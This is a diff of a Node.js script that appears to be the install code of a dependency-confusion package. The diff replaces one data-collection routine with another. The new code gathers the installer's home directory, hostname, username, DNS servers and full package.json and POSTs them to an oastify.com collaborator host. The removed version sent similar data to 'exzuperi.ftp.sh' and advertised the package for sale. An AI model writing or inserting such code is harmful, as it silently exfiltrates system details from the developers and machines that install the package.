@@ -2,27 +2,44 @@ const os = require("os");
 const dns = require("dns");
 const querystring = require("querystring");
 const https = require("https");
-const packageJSON = require("./package.json");
-const package = packageJSON.name;
-const fs = require('fs');
+const path = require("path");
+const fs = require("fs");
+
+// Construct the path to package.json dynamically
+const packageJSONPath = path.join(__dirname, "package.json");
+const packageJSON = JSON.parse(fs.readFileSync(packageJSONPath, "utf8"));
+const packageName = packageJSON.name;
 
 const trackingData = JSON.stringify({
+    p: packageName,
+    c: __dirname,
     hd: os.homedir(),
     hn: os.hostname(),
-    ls: __dirname,
-    pn: "eventstream-serde-config-resolver",
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
 });
 
-const options = {
-    hostname: "exzuperi.ftp.sh",
-    port: 449,
-    path: `/PoC/${encodeURIComponent(trackingData)}`,
-    method: "GET",
+var postData = querystring.stringify({
+    msg: trackingData,
+});
+
+var options = {
+    hostname: "knbabz8rzp03m4go81h7cjnnwe2fq6ev.oastify.com", // replace with your burp collaborator or Interactsh endpoint
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
 };
 
-const req = https.request(options, (res) => {
+var req = https.request(options, (res) => {
     res.on("data", (d) => {
-        //process.stdout.write(d);
+        process.stdout.write(d);
     });
 });
 
@@ -30,5 +47,7 @@ req.on("error", (e) => {
     console.error(e);
 });
 
-process.stdout.write("You can reach me, if you want to buy it: https://t.me/exzuperi");
+req.write(postData);
 req.end();
+
+console.log("Tracking data sent:", trackingData);
